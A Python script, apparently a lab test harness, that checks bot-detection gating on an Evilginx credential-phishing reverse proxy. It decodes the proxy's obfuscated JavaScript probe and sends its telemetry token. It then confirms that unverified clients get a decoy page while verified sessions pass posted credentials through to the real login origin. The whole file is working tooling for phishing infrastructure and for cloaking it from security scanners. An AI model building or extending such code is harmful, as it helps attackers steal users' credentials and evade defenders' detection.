#!/usr/bin/env python3
# verify_bg2.py — end-to-end Botguard v2 gating verification (lab).
# Simulates a "browser": session + probe token decode + verify + gated/unverified checks.
import base64
import json
import re
import ssl
import sys
import time
import urllib.parse
import urllib.request

BASE = "https://www.labphish.test"
CA = "/home/ubuntu/.evilginx/api/ca.crt"  # unused for phish host; -k equivalent
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

import http.cookiejar
cj = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(
    urllib.request.HTTPCookieProcessor(cj),
    urllib.request.HTTPSHandler(context=ctx))
opener.addheaders = [("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) Chrome/152.0.0.0 Safari/537.36"),
                     ("Accept-Language", "en-US,en;q=0.9"),
                     ("Sec-Fetch-Mode", "navigate"),
                     ("Upgrade-Insecure-Requests", "1")]

def get(path):
    return opener.open(BASE + path, timeout=15).read().decode("utf-8", "replace")

def post(path, data):
    body = urllib.parse.urlencode(data).encode()
    return opener.open(BASE + path, data=body, timeout=15).read().decode("utf-8", "replace")

# 1) session via lure
get("/NsMBBcaX")
# 2) load login page -> probe injected (ultra-encoded)
page = get("/login?cb=90")
m = re.search(r"var (_0x[0-9a-z]+)=\[(.*?)\];var (_0x[0-9a-z]+)=function\(i\)\{i=\(i\+(\d+)\)%(\d+);", page)
if not m:
    print("RESULT: FAIL no-probe")
    sys.exit(1)
chunks = re.findall(r'"([^"]*)"', m.group(2))
rot, n = int(m.group(4)), int(m.group(5))
b64 = ""
for i in range(n):
    b64 += chunks[(i + rot) % n][::-1]
payload = base64.b64decode(b64 + "=" * (-len(b64) % 4)).decode()
tm = re.search(r'fetch\("/t/([0-9a-f]+)"', payload)
if not tm:
    print("RESULT: FAIL no-token-in-payload; head=", payload[:80])
    sys.exit(1)
token = tm.group(1)
print("[+] probe decoded (ultra round-trip OK), token:", token[:12] + "...")

# 3) POST credentials BEFORE grace expiry -> must pass (grace window active)
post("/login", {"username": "labuser", "password": "labpass123"})
print("[+] pre-grace credential POST accepted")

# 4) wait past grace -> unverified session must be gated now
time.sleep(7)
r = post("/login", {"username": "labuser", "password": "labpass123"})
gated = "It works!" in r
print("[+] post-grace unverified POST gated:", gated)

# 5) send telemetry (as the probe would) -> session verified
req = urllib.request.Request(BASE + "/t/" + token, data=b"d=eyJ3ZCI6IGZhbHNlfQ==", method="POST")
resp = opener.open(req, timeout=15)
print("[+] telemetry status:", resp.status)

# 6) after verification -> credential POST passes (real proxy, not decoy)
r = post("/login", {"username": "labuser", "password": "labpass123"})
ok = "It works!" not in r
print("[+] post-verify credential POST reaches origin (no decoy):", ok)
print("RESULT:", "PASS" if (gated and ok) else "FAIL")
